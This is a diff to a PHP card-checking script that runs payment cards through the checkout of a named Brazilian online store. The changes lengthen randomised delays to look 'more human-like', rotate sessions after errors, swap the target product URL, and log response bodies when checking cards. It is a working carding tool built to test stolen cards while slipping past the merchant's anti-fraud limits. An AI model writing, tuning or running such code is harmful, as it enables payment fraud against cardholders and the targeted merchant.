@@ -77,7 +77,7 @@ class CurlX {
     public function get($url, $params = [], $headers = []) {
         try {
             // Add random delay to appear more human-like
-            usleep(rand(500000, 1500000)); // 0.5-1.5 seconds
+            usleep(rand(2000000, 4000000)); // 2-4 seconds (mais lento)
             
             $response = $this->client->get($url, [
                 'query' => $params, 
@@ -98,7 +98,7 @@ class CurlX {
     public function post($url, $body = '', $headers = []) {
         try {
             // Add random delay
-            usleep(rand(800000, 2000000)); // 0.8-2 seconds for POST requests
+            usleep(rand(3000000, 6000000)); // 3-6 seconds for POST requests (bem mais lento)
             
             $defaultHeaders = [
                 'Referer' => 'https://amazonicocare.com.br/',
@@ -249,7 +249,7 @@ function checkCard($card, $sessionManager, $maxRetries = 3) {
         
         try {
             // Step 1: Get checkout page and form data
-            $checkoutUrl = 'https://amazonicocare.com.br/products/condicionador-300ml-oca?cart_token=hWNEFJny6zovgZikjVn2F3kA';
+            $checkoutUrl = 'https://amazonicocare.com.br/products/cronograma-de-mascaras-amazonico-care';
             $response = $client->get($checkoutUrl);
             
             if ($response->error) {
@@ -314,7 +314,7 @@ function checkCard($card, $sessionManager, $maxRetries = 3) {
             
             // Rotate session on error
             $sessionManager->rotateSession();
-            sleep(rand(2, 5));
+            sleep(rand(5, 10)); // Delay maior entre tentativas
         }
     }
 }
@@ -409,10 +409,11 @@ function analyzeResponse($response, $card) {
         }
     }
     
-    // Default case - unknown response
+    // Default case - unknown response  
+    $truncatedBody = substr($body, 0, 200);
     return [
         'status' => 'unknown',
-        'message' => 'Resposta desconhecida - Status: ' . $statusCode,
+        'message' => 'Resposta desconhecida - Status: ' . $statusCode . ' | Body: ' . $truncatedBody,
         'brand' => $detected_brand,
         'bank' => $detected_bank
     ];
